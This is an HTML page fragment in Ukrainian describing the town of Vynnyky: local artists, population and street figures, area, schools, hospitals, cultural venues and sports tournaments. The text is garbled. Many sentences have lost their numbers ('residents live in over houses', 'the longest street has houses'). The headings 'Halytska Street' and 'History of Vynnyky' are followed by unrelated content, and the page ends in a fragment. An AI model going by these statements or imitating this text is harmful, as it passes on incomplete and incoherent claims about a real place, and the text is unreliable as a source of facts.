	<p>Микола Федюк — художник. Ірина Банах-Твердохліб - художниця, представляє українське мистецтво за кордоном. Сьогодні примножують славу рідного міста президент музеїв України, мистецтвознавець Борис Возницький, відомий художник-керамік, заслужений діяч мистецтв України Тарас Левків. На сьогодні в Винниках проживають мешканців у понад будинків, з них більше - у власних помешканнях. У Винниках вулиць. Найдовша вулиця - Івана Франка будинків , а найкоротша - Жупан 5 будинків.</p><strong><a id='u4'></a><h2>Вулиця Галицька (Винники)</h2></strong><p>Найчисленніша за кількістю мешканців вулиця Кільцева - людей. Місто займає площу 6,7 км2 Протягом останнього десятиріччя у Винниках споруджено ряд багатоквартирних житлових будинків, збудовано нову автоматизовану телефонну станцію. У місті з'явилися новий ринок, комплекс торгівельних павільйонів, крамниць, працюють приватні підприємства. У Винниках діють 2 бібліотеки, дитячий садок, 4 загальноосвітні школи.</p><img src="https://image.isu.pub/191203191252-1bb88fb17927e86560f9befad51f20df/jpg/page_1.jpg" alt="" style="max-width: 480px; max-height: 480px;"/><p>Будинок дитячої та юнацької творчості, школа мистецтв, дитячо-юнацька спортивна школа "Тризуб", Будинок культури, КЦ «Дозвілля», клуб «Галактика», історико-краєзнавчий музей, 2 поліклініки, 2 лікарні, обласна лічниця інвалідів війни та репресованих ім. Липи, видається газета «Винниківський Вісник». Місто Винники багате своїми звичаями та обрядами.</p>
		
	<p>Організатором цієї справи серед молоді є "Золота молодь Винник". Створені товариства насильно депортованих українців з Надсяння.</p><strong><a id='u5'></a><h2>Історія Винник</h2></strong><p>Традиційними стали міжнародні дитячі турніри з футболу "Кубок Винник", обласні змагання з вільної боротьби, щорічні міські турніри з настільного тенісу "На приз різдвяних канікул Візитною карткою м. Винники за правом вважається обласний фестиваль дитячої української естрадної пісні "На крилах дитинства", авторами цього проекту є Будинок дитячої та юнацької творчості і ВТФ "Друксервіс". Історія Винник рр.</p>
